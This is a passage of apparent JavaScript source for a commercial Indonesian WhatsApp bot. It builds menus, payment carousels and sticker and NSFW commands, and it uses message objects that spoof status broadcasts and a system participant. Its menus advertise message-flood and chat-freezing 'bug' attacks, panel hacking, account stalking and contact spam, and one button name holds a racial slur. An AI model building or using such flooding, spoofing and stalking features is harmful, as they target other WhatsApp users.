        const qjpm = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: `々 | 🔴 Xinbot: ${runtime(process.uptime())}`,jpegThumbnail: ""}}}
        
		const callg = {
			key: {
				remoteJid: 'status@broadcast',
				participant: '0@s.whatsapp.net',
				fromMe: false,
			},
			message: {
				callLogMesssage: {
                    isVideo: true,
                    callOutcome: "1",
                    durationSecs: "0",
                    callType: "REGULAR",
                    participants: [{ jid: "0@s.whatsapp.net", callOutcome: "1" }]
                }
			}
		};
		
const nullgb = {
        key: {
            fromMe: false,
            participant: '0@s.whatsapp.net',
            remoteJid: 'status@broadcast'
        },
        message: {
            documentMessage: {
                contactVcard: true
            }
        }
    };
    
 // Random Reply //
 const TReply = [xpaytod, newReply]
 let RRelply = Math.floor(Math.random() * TReply.length)
 const ReplyX = TReply[RRelply]
 
        // const q //
		const sendReact = async (emote) => {
        xin.sendMessage(remoteJid, {
          react: {
            text: emote,
            key: m.key,
          },
        })
      }
      
		const qstore = {
   key: {
      fromMe: false,
     participant: `0@s.whatsapp.net`,
   ...(m.chat ? {
         remoteJid: "status@broadcast"
} : {})
}, message: {
"productMessage": {
"product": {
"productImage": {
"mimetype": "image/jpeg",
"jpegThumbnail": "",
},
"title": `Xinnine - Marketplace`,
"description": null,
"currencyCode": "IDR",
"priceAmount1000": "999999999",
"retailerId": ` Xinner `,
"productImageCount": 1
},
"businessOwnerJid": `0@s.whatsapp.net`
}}
}

const locq = {key: {participant: '0@s.whatsapp.net', ...(m.chat ? {remoteJid: `status@broadcast`} : {})}, message: {locationMessage: {name: ` ⽶ `,jpegThumbnail: ""}}}

//  	if (m.message)  {		
if (isCmd) {
console.log(chalk.magenta.bold(` ╭──────────[ Xinbot Command Logs ]─────────────╮ `), chalk.blue.bold(`\n  Input Command :`), chalk.white.bold(`${prefix+command}`), chalk.blue.bold(`\n  From :`), chalk.white.bold(m.isGroup ? `Group - ${m.sender.split("@")[0]}\n` : m.sender.split("@")[0] +`\n`), chalk.magenta.bold(`╰──────────────────────────────────────────────╯\n`))
}
//=================================================//
		switch (command) {
			case "xmenu": case "xm": {
				let xinmenu = `
Hi! I Am A WhatsApp Bot Created By Xin Ready to Assist You ✅
Status : ${xin.public ? 'Public' : 'Self'}
*Developer: t.me/htmlxin*
${readmore}
ᝄ ⌜ Pterodactyl Menu ⌟
⳺ .1gb
⳺ .2gb
⳺ .3gb
⳺ .4gb
⳺ .5gb
⳺ .6gb
⳺ .7gb
⳺ .8gb
⳺ .9gb
⳺ .10gb
⳺ .unli
⳺ .createadmin
⳺ .delpanel
⳺ .deladmin
⳺ .listserver
⳺ .listadmin

ᝄ ⌜ Pterodactyl Menu V2 ⌟
⳺ .1gb2
⳺ .2gb2
⳺ .3gb2
⳺ .4gb2
⳺ .5gb2
⳺ .6gb2
⳺ .7gb2
⳺ .8gb2
⳺ .9gb2
⳺ .10gb2
⳺ .unli2
⳺ .listserver-v2
⳺ .cadmin-v2
⳺ .deladmin-v2
⳺ .delpanel-v2

ᝄ ⌜ VPS Menu ⌟
⳺ .installpanel
⳺ .installtemastellar
⳺ .installtemabilling
⳺ .installtemaenigma
⳺ .startwings
⳺ .uninstallpanel
⳺ .uninstalltema
⳺ .hackbackpanel
⳺ .subdomain
⳺ .domain

ᝄ ⌜ Digital Ocean Menu ⌟
⳺ .r1c1
⳺ .r2c1
⳺ .r4c2
⳺ .r8c4
⳺ .r16c4
⳺ .sisadroplet
⳺ .deldroplet
⳺ .listdroplet
⳺ .rebuild
⳺ .restartvps
⳺ .sendvps
${readmore}
ᝄ ⌜ Group Menu ⌟
⳺ .add
⳺ .kick
⳺ .welcome [ on / off ]
⳺ .antilink [ on / off ]
⳺ .hidetag
⳺ .leave
⳺ .resetlinkgc
⳺ .linkgc

ᝄ ⌜ Tools Menu ⌟
⳺ .gpt
⳺ .modapk
⳺ .qc
⳺ .tourl
⳺ .ssweb
⳺ .translate
⳺ .tohd
⳺ .shortlink
⳺ .cekidch
⳺ .cekidgc
⳺ .readviewonce
⳺ .stickerwm
⳺ .sticker
⳺ .bratsticker
⳺ .toimage
 
 ᝄ ⌜ Stalk Menu ⌟
⳺ .igstalk
⳺ .ttstalk
⳺ .ffstalk
⳺ .mlstalk
${readmore}
 ᝄ ⌜ JavaScript Menu ⌟
 ⳺ .encrypt
 ⳺ .encrypthard
 ⳺ .decrypt
 
ᝄ ⌜ Download & Search Menu ⌟
⳺ .tiktok
⳺ .tiktokmp3
⳺ .ttsearch
⳺ .playspotify
⳺ .instagram
⳺ .ytmp3
⳺ .ytmp4
⳺ .ytsearch
⳺ .play
⳺ .pinterest

ᝄ ⌜ +18 Menu ⌟
⳺ .nsfw
⳺ .r34

ᝄ ⌜ JB Menu ⌟
⳺ .done
⳺ .proses
⳺ .pushkontak
⳺ .pushkontak2
⳺ .jpm
⳺ .jpmhidetag
⳺ .jpmtesti
⳺ .payment

ᝄ ⌜ Owner Menu ⌟
⳺ .addprem
⳺ .delprem
⳺ .addresellerpanel
⳺ .delresellerpanel
⳺ .addresellersubdo
⳺ .delresellersubdo
⳺ .delowner
⳺ .self
⳺ .public

ᝄ ⌜ Control & Ping Menu ⌟
⳺ .speed
⳺ .runtime

ᝄ ⌜ Bug Menu ⌟
⳺ .floodbug
⳺ .floodgroup
⳺ .xinfreeze
⳺ .clearbugs

╭ Thanks To ╮

© Caywyzz ( t.me/caywyzzneh )
© Devorsixcore ( t.me/devor6core )
© Remonvoidd ( t.me/bascleve )
© Abyxx ( t.me/byxxone )
 <!> For Helping me Create this Bot Script!
				`
				xin.sendMessage(m.chat, { 
					video: G1 ,
                    gifPlayback: true,
					caption: xinmenu,
					contextInfo: {
						mentionedJid: [
							m.sender
						],
						externalAdReply: {
							showAdAttribution: true,
							title: `Xinbot`,
							body: `🔵 Active For ${runtime(process.uptime())} `,
							previewType: "IMAGE",
							thumbnailUrl: 'https://files.catbox.moe/vdu4n4.png',
							sourceUrl: `t.me/htmlxin`,
							renderLargerThumbnail: true,
							mediaType: 1,
						}
					},
				}, { quoted: qmime })
			await xin.sendMessage(m.chat, {audio: A1, mimetype:'audio/mpeg', ptt: false}, {quoted: m })
}		
			break
			case "pay": case "payment": {
if (!isOwner) return ReplyX(`Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin`)
let imgdana = await prepareWAMessageMedia({ image: fs.readFileSync("./gudang/imgs/dana.jpg")}, { upload: xin.waUploadToServer })
let imgovo = await prepareWAMessageMedia({ image: fs.readFileSync("./gudang/imgs/ovo.jpg")}, { upload: xin.waUploadToServer })
let imggopay = await prepareWAMessageMedia({ image: fs.readFileSync("./gudang/imgs/gopay.jpg")}, { upload: xin.waUploadToServer })
let imgqris = await prepareWAMessageMedia({ image: fs.readFileSync("./gudang/imgs/qr.jpeg")}, { upload: xin.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "\nList Payment Xin"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgdana
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Dana Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.dana}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgovo
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"OVO Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.ovo}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imggopay
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_copy",
"buttonParamsJson": `{\"display_text\":\"Gopay Payment\",\"id\":\"123456789\",\"copy_code\":\"${global.gopay}\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgqris
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\" QRIS Payment\",\"url\":\"${global.qris}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}
]
})
})}
}}, {userJid: m.sender, quoted: qpayment})
await xin.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}
break
case "proses": {
if (!isOwner) return ReplyX("Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin!")
if (!q) return m.reply("Syntax Error\n. proses Jasa Sunat Online")
const msg = {
text: `*Dana Masuk ✅*
Sedang Proses Transaksi
📦 ${text}

_*© 2024 - Xin*_`
}
await xin.sendMessage(m.chat, msg, {quoted: null})
}
break
        	case 'nsfw': {
        	ReplyX(` Process Mengambil Video NSFW `)
			sbe = await randomNsFw()
			cejd = sbe[Math.floor(Math.random(), sbe.length)]
			xin.sendMessage(m.chat, {
				video: { url: cejd.video_1 },
				caption: `⭔ Title : ${cejd.title}
⭔ Category : ${cejd.category}
⭔ Mimetype : ${cejd.type}
⭔ Views : ${cejd.views_count}
⭔ Shares : ${cejd.share_count}
⭔ Source : ${cejd.link}
⭔ Media Url : ${cejd.video_1}`
			}, { quoted: m })
		}
		break
		
			case 'rule34': {
			async function rule34Random() {
				try {
					let response = await axios.get('https://api.rule34.xxx/index.php?page=dapi&s=post&q=index&json=1')
					let results = response.data
					if (!Array.isArray(results) || results.length === 0) {
						throw new Error('No images found')
					}
					let randomImage = results[Math.floor(Math.random() * results.length)]
					let imageUrl = randomImage.file_url
					if (!imageUrl) {
						throw new Error('Image URL not found')
					}
					return { status: 200, imageUrl }
				} catch (error) {
					console.error('Error:', error)
					return { status: 500, error: error.message }
				}
			}
			async function sendRandomRule34Image(m) {
				try {
					let response = await rule34Random()
					if (response.status !== 200) {
						throw new Error(response.error)
					}
					let imageUrl = response.imageUrl
					xin.sendMessage(m.chat, { image: { url: imageUrl }, caption: 'Random Image from Rule34\n\n*Powered By rule34.xxx*' }, { quoted: m })
				} catch (e) {
					reply(e.message)
				}
			}
			sendRandomRule34Image(m)
		}
		break
		
		// DEL - ADD - GET //
case 'addcase': {
				if (!isOwner) return ReplyX("Khusus Owner\nBeli Script Di wa.me/+6281937707120 atau di\nt.me/htmlxin")
				if (!text) return m.reply('Mana case nya bang?');
				let data = await addCase("xinnbot.js", text)
				m.reply(data.message)
			}
			break
			case 'delcase': {
				if (!isOwner) return ReplyX("Khusus Owner\nBeli Script Di wa.me/+6281937707120 atau di\nt.me/htmlxin")
				if (!text) return m.reply('Mana case nya bang?');
				let data = await dellCase("xinnbot.js", text)
				m.reply(data.message)
			}
			break
			case 'getcase': {
				if (!isOwner) return ReplyX("Khusus Owner\nBeli Script Di wa.me/+6281937707120 atau di\nt.me/htmlxin")
				if (!text) return m.reply('Mana case nya bang?');
				let data = await getCase(text)
				m.reply(data)
			}
			break
			
case "welcome": {
if (!isOwner) return ReplyX("Khusus Owner")
if (!text) return m.reply(`Example *.welcome* on/off`)
if (/on/.test(text)) {
global.welcome = true
m.reply("Berhasil menyalakan welcome")
} else if (/off/.test(text)) {
global.welcome = false
m.reply("Berhasil mematikan welcome")
} else {
return m.reply(`Example *.welcome* on/off`)
}
}
break 
case "antilink": {
if (!isOwner) return ReplyX("Khusus Owner")
if (!text) return m.reply(`Example *.antilink* on/off`)
if (/on/.test(text)) {
global.antilink = true
m.reply("Berhasil menyalakan antilink")
} else if (/off/.test(text)) {
global.antilink = false
m.reply("Berhasil mematikan antilink")
} else {
return m.reply(`Example *.antilink* on/off`)
}
}
break 
case 'bratsticker': {
if (!q) return ReplyX(`Masukkan teks\n\nContoh: ${prefix + command} Atmin Ganteng`);
let rulz = `https://api.zenkey.my.id/api/maker/brat?text=${encodeURIComponent(q)}&apikey=zenkey`;
try {
const res = await axios.get(rulz, { responseType: 'arraybuffer' });
const buffer = Buffer.from(res.data, 'binary');
await xin.sendImageAsSticker(m.chat, buffer, m, { packname: `Xinbot`, author: `V1.6` });
} catch (e) {
console.log(e);
await ReplyX(`Sedang maintenance atau API error`);
    }
}
break;
case "qc": {
if (!text) return m.reply("Mana Teksnya?")
let warna = ["#000000", "#ff2414", "#22b4f2", "#eb13f2"]
let reswarna = await warna[Math.floor(Math.random()*warna.length)]
m.reply("Proses generate Qc . . .")
const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": reswarna,
  "width": 512,
  "height": 768,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": m.pushName,
        "photo": {
          "url": ppuser
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
};
        const response = axios.post('https://bot.lyo.su/quote/generate', json, {
        headers: {'Content-Type': 'application/json'}
}).then(async (res) => {
    const buffer = Buffer.from(res.data.result.image, 'base64')
    let tempnya = makeid+".png"
await fs.writeFile(tempnya, buffer, async (err) => {
if (err) return m.reply("Error")
await xin.sendImageAsSticker(m.chat, tempnya, m, {packname: global.author })
fs.unlinkSync(`./${tempnya}`)
})
})
}
break
case "buttonmenu": case "spesialmenu": {
await xin.sendMessage(m.chat, {
          react: {
            text: '⏳',
            key: m.key,
          }})
          await xin.sendMessage(m.chat, {
          react: {
            text: '3️⃣',
            key: m.key,
          }})
await xin.sendMessage(m.chat, {
          react: {
            text: '2️⃣',
            key: m.key,
          }})
await xin.sendMessage(m.chat, {
          react: {
            text: '1️⃣',
            key: m.key,
          }})
          await xin.sendMessage(m.chat, {
          react: {
            text: '☑️',
            key: m.key,
          }});
          let imgsc = await prepareWAMessageMedia({ image: fs.readFileSync("./gudang/imgs/banner/x.jpg") }, { upload: xin.waUploadToServer })
          let xczt = await prepareWAMessageMedia({ image: fs.readFileSync("./gudang/imgs/banner/0.jpg") }, { upload: xin.waUploadToServer })
          let xcezet = await prepareWAMessageMedia({ image: fs.readFileSync("./gudang/imgs/banner/banner.jpg") }, { upload: xin.waUploadToServer })
          let xczet = await prepareWAMessageMedia({ image: fs.readFileSync("./gudang/imgs/banner/banner2.jpg") }, { upload: xin.waUploadToServer })
          let xczt9 = await prepareWAMessageMedia({ image: fs.readFileSync("./gudang/imgs/banner/banner3.jpg") }, { upload: xin.waUploadToServer })
          let xcezt = await prepareWAMessageMedia({ image: fs.readFileSync("./gudang/imgs/banner/banner4.jpg") }, { upload: xin.waUploadToServer })
          let xCz = await prepareWAMessageMedia({ image: fs.readFileSync("./gudang/imgs/banner/banner5.jpg") }, { upload: xin.waUploadToServer })
const msgii = await generateWAMessageFromContent(m.chat, {
ephemeralMessage: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*X-Bot\n© Xin"
}), 
contextInfo: {
isForwarded: false
}, 
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: [{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `ᝄ ⌜ Pterodactyl Menu ⌟
⳺ .1gb
⳺ .2gb
⳺ .3gb
⳺ .4gb
⳺ .5gb
⳺ .6gb
⳺ .7gb
⳺ .8gb
⳺ .9gb
⳺ .10gb
⳺ .unli
⳺ .createadmin
⳺ .delpanel
⳺ .deladmin
⳺ .listserver
⳺ .listadmin
`, 
hasMediaAttachment: true,
...xczt
}), 
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Buy Script To Dev\",\"url\":\"https://t.me/htmlxin\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `ᝄ ⌜ Pterodactyl Menu V2 ⌟
⳺ .1gb2
⳺ .2gb2
⳺ .3gb2
⳺ .4gb2
⳺ .5gb2
⳺ .6gb2
⳺ .7gb2
⳺ .8gb2
⳺ .9gb2
⳺ .10gb2
⳺ .unli2
⳺ .listserver-v2
⳺ .cadmin-v2
⳺ .deladmin-v2
⳺ .delpanel-v2
`, 
hasMediaAttachment: true,
...xCz
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Buy Script To Dev\",\"url\":\"https://t.me/htmlxin\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `ᝄ ⌜ Digital Ocean Menu ⌟
⳺ .r1c1
⳺ .r2c1
⳺ .r4c2
⳺ .r8c4
⳺ .r16c4
⳺ .sisadroplet
⳺ .deldroplet
⳺ .listdroplet
⳺ .rebuild
⳺ .restartvps
⳺ .sendvps
`, 
hasMediaAttachment: true,
...xcezet
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Buy Script To Dev\",\"url\":\"https://t.me/htmlxin\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `ᝄ ⌜ VPS Menu ⌟
⳺ .installpanel
⳺ .installtemastellar
⳺ .installtemabilling
⳺ .installtemaenigma
⳺ .startwings
⳺ .uninstallpanel
⳺ .uninstalltema
⳺ .hackbackpanel
⳺ .subdomain
⳺ .domain
`, 
hasMediaAttachment: true,
...xczet
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Buy Script To Dev\",\"url\":\"https://t.me/htmlxin\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `ᝄ ⌜ Stalk Menu ⌟
⳺ .igstalk
⳺ .ttstalk
⳺ .ffstalk
⳺ .mlstalk

ᝄ ⌜ +18 Menu ⌟
⳺ .nsfw
⳺ .r34
`, 
hasMediaAttachment: true,
...xczt
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Buy Script To Dev\",\"url\":\"https://t.me/htmlxin\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `ᝄ ⌜ Group Menu ⌟
⳺ .add
⳺ .kick
⳺ .welcome [ on / off ]
⳺ .antilink [ on / off ]
⳺ .hidetag
⳺ .leave
⳺ .resetlinkgc
⳺ .linkgc

`, 
hasMediaAttachment: true,
...xcezt
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Buy Script To Dev\",\"url\":\"https://t.me/htmlxin\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `ᝄ ⌜ Download & Search Menu ⌟
⳺ .tiktok
⳺ .instagram
⳺ .tiktokmp3
⳺ .ttsearch
⳺ .playspotify
⳺ .ytmp3 - ytmp4 - ytsearch
⳺ .play
⳺ .pinterest
`, 
hasMediaAttachment: true,
...xczt9
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Buy Script To Dev\",\"url\":\"https://t.me/htmlxin\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `
ᝄ ⌜ Tools Menu ⌟
⳺ .gpt
⳺ .modapk
⳺ .qc
⳺ .tourl
⳺ .ssweb
⳺ .translate
⳺ .tohd
⳺ .shortlink
⳺ .cekidch
⳺ .cekidgc
⳺ .readviewonce
⳺ .stickerwm
⳺ .sticker
⳺ .bratsticker
⳺ .toimage
 
`, 
hasMediaAttachment: true,
...xcezet
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Buy Script To Dev\",\"url\":\"https://t.me/htmlxin\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `
ᝄ ⌜ JB Menu ⌟
⳺ .done
⳺ .proses
⳺ .pushkontak
⳺ .pushkontak2
⳺ .jpm
⳺ .jpmhidetag
⳺ .jpmtesti
⳺ .payment
`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Buy Script To Dev\",\"url\":\"https://t.me/htmlxin\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `
ᝄ ⌜ Owner Menu ⌟
⳺ .addprem
⳺ .delprem
⳺ .addresellerpanel
⳺ .delresellerpanel
⳺ .addresellersubdo
⳺ .delresellersubdo
⳺ .delowner
⳺ .self
⳺ .public

`, 
hasMediaAttachment: true,
...xCz
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Buy Script To Dev\",\"url\":\"https://t.me/htmlxin\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `ᝄ ⌜ Bug Menu ⌟
⳺ .floodbug
⳺ .floodgroup
⳺ .xinfreeze
⳺ .clearbugs
`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Buy Script To Dev\",\"url\":\"https://t.me/htmlxin\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}, 
{
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `╭ Thanks To ╮

© Caywyzz ( t.me/caywyzzneh )
© Devorsixcore ( t.me/devor6core )
© Remonvoidd ( t.me/bascleve )
© Abyyxx ( t.me/byxxone )

 <!> For Helping me Create this Bot Script!`, 
hasMediaAttachment: true,
...xczet
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
name: "cta_url",
buttonParamsJson: `{\"display_text\":\"Buy Script To Dev\",\"url\":\"https://t.me/htmlxin\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
}]
})
})}
}}, {userJid: m.sender, quoted: qmime})
await xin.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
}
break
case "menu": {
await xin.sendMessage(m.chat, {
          react: {
            text: '⏳',
            key: m.key,
          }})
          await xin.sendMessage(m.chat, {
          react: {
            text: '3️⃣',
            key: m.key,
          }})
await xin.sendMessage(m.chat, {
          react: {
            text: '2️⃣',
            key: m.key,
          }})
await xin.sendMessage(m.chat, {
          react: {
            text: '1️⃣',
            key: m.key,
          }})
          await xin.sendMessage(m.chat, {
          react: {
            text: '✅',
            key: m.key,
          }});
	let mgmenu = await prepareWAMessageMedia({ image: B1 }, { upload: xin.waUploadToServer })
	const msgii = await generateWAMessageFromContent(m.chat, {
	viewOnceMessageV2Extension: {
	message: {
	messageContextInfo: {
	deviceListMetadata: {},
	deviceListMetadataVersion: 2
	}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
	body: proto.Message.InteractiveMessage.Body.fromObject({
	text: "X-Bot\n> © Xin"
	}),
	carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
	cards: [{
	body: proto.Message.InteractiveMessage.Body.fromObject({
				  }),
				  footer: proto.Message.InteractiveMessage.Footer.fromObject({
				  }),
				  header: proto.Message.InteractiveMessage.Header.fromObject({
					title: `Hai ${pushname}! 👋 ${ucapanWaktu} !
	*Xinbot* adalah bot yang dirancang oleh *Xin* yang siap membantu kebutuhan hosting anda di WhatsApp & menghibur anda dengan fitur-fitur lainnya! 🔥
	╭──────────────────╮
	   Dev: t.me/htmlxin 👤

	   Hanya menampilkan beberapa Menu yang 
	   paling sering digunakan di sini, untuk menampilkan semua menu,
	   klik tombol di bawah 
		
		© Xin
	╰──────────────────╯
	ᝄ ⌜ Pterodactyl Menu ⌟
	⳺ .1gb - .unli
	
	ᝄ ⌜ VPS Menu ⌟
	⳺ .installpanel & uninstallpanel
	⳺ .installtemastellar / billing / enigma
	
	ᝄ ⌜ Digital Ocean Menu ⌟
	⳺ .r1c1 - r16c4
	⳺ .sisadroplet - listdroplet - deldroplet
	⳺ .rebuild
	⳺ .restartvps - sendvps
	
	ᝄ ⌜ Tools Menu ⌟
	⳺ .cekidch - cekidgc
	
	ᝄ ⌜ JavaScript Menu ⌟
	⳺ .encrypt - encrypthard - decrypt `,
					hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: B1 }, { upload: xin.waUploadToServer }))
				  }),
	nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
	buttons: [{
	"name": "single_select",
"buttonParamsJson": `{\"title\":\"⧼ Display Menu ⧽ \",\"sections\":[{\"title\":\"© t.me/htmlxin\",\"highlight_label\":\"\",\"rows\":[{\"header\":\"All Menu Displayer\",\"title\":\"Click To Display All Menu\",\"description\":\"© t.me/htmlxin\",\"id\":\".xm\"},{\"header\":\"Slide Menu Displayer\",\"title\":\"Click To Display Slide Menu\",\"description\":\"© Xin\",\"id\":\".buttonmenu\"}]}]}`
	},
    {
	"name": "cta_url",
	"buttonParamsJson": `{\"display_text\":\"Buy Script To Dev\",\"url\":\"https://t.me/htmlxin\",\"merchant_url\":\"https://www.google.com\"}`
	}]
	})
	}
	]
	})
	})}
	}}, {userJid: m.sender, quoted: qmime})
	await xin.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
	}
	break
	case "xbtn": {
	if (!isOwner) return ReplyX("Khusus Owner")
	await xin.sendMessage(m.chat, {react: {text: '🖕🏽', key: m.key}})
	let mgmenu = await prepareWAMessageMedia({ image: B1 }, { upload: xin.waUploadToServer })
	const msgii = await generateWAMessageFromContent(m.chat, {
	viewOnceMessageV2Extension: {
	message: {
	messageContextInfo: {
	deviceListMetadata: {},
	deviceListMetadataVersion: 2
	}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
	body: proto.Message.InteractiveMessage.Body.fromObject({
	text: "X-Bot\n> © Xin"
	}),
	carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
	cards: [{
	body: proto.Message.InteractiveMessage.Body.fromObject({
				  }),
				  footer: proto.Message.InteractiveMessage.Footer.fromObject({
				  }),
				  header: proto.Message.InteractiveMessage.Header.fromObject({
					title: `t.me/htmlxin\n#ily`,
					hasMediaAttachment: true,...(await prepareWAMessageMedia({ image: bnr4 }, { upload: xin.waUploadToServer }))
				  }),
	nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
	buttons: [{
	"name": "single_select",
									"buttonParamsJson": `{\"title\":\"single_select\",\"sections\":[{\"title\":\"single_select\",\"highlight_label\":\"single_select\",\"rows\":[{\"header\":\"single_select\",\"title\":\"single_select\",\"description\":\"single_select\",\"id\":\".play\"},{\"header\":\"single_select\",\"title\":\"single_select\",\"description\":\"single_select\",\"id\":\".play\"}]}]}`
								},
								{
									"name": "nigga twerk",
									"buttonParamsJson": `{\"display_text\":\"quick_reply\",\"id\":\".mute on\"}`
								},
								{
									"name": "cta_url",
									"buttonParamsJson": `{\"display_text\":\"url\",\"url\":\"https://www.google.com\",\"merchant_url\":\"https://www.google.com\"}`
								},
								{
									"name": "cta_call",
									"buttonParamsJson": `{\"display_text\":\"call\",\"id\":\"message\"}`
								},
								{
									"name": "cta_copy",
									"buttonParamsJson": `{\"display_text\":\"copy\",\"id\":\"123456789\",\"copy_code\":\"message\"}`
								},
								{
									"name": "quick_reply",
									"buttonParamsJson": "{\"display_text\":\"quick_reply\",\"title\":\"quick_reply\",\"id\":\".owner\"}" 
									},
									{
									"name": "cta_reminder",
									"buttonParamsJson": `{\"display_text\":\"cta_reminder\",\"id\":\"message\"}`
								},
								{
									"name": "cta_cancel_reminder",
									"buttonParamsJson": `{\"display_text\":\"cta_cancel_reminder\",\"id\":\"message\"}`
								},
								{
									"name": "address_message",
									"buttonParamsJson": `{\"display_text\":\"address_message\",\"id\":\"message\"}`
								},
								{
									"name": "send_location",
									"buttonParamsJson": ""
	}]
	})
	}
	]
	})
	})}
	}}, {userJid: m.sender, quoted: qjpm})
	await xin.relayMessage(m.chat, msgii.message, {messageId: msgii.key.id})
	}
	break
case "subdomain": case "listsubdomain": {
const obj = Object.keys(global.subdomain)
let count = 0
let teks = `
 *#- List all domain server*\n`
for (let i of obj) {
count++
teks += `\n* ${count}. ${i}\n`
}
teks += `\n Contoh : *.domain 2 host|ipvps*\n`
m.reply(teks)

}
break
			case "domain": {
if (!isOwner && isReDomain) return ReplyX(`Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin`)
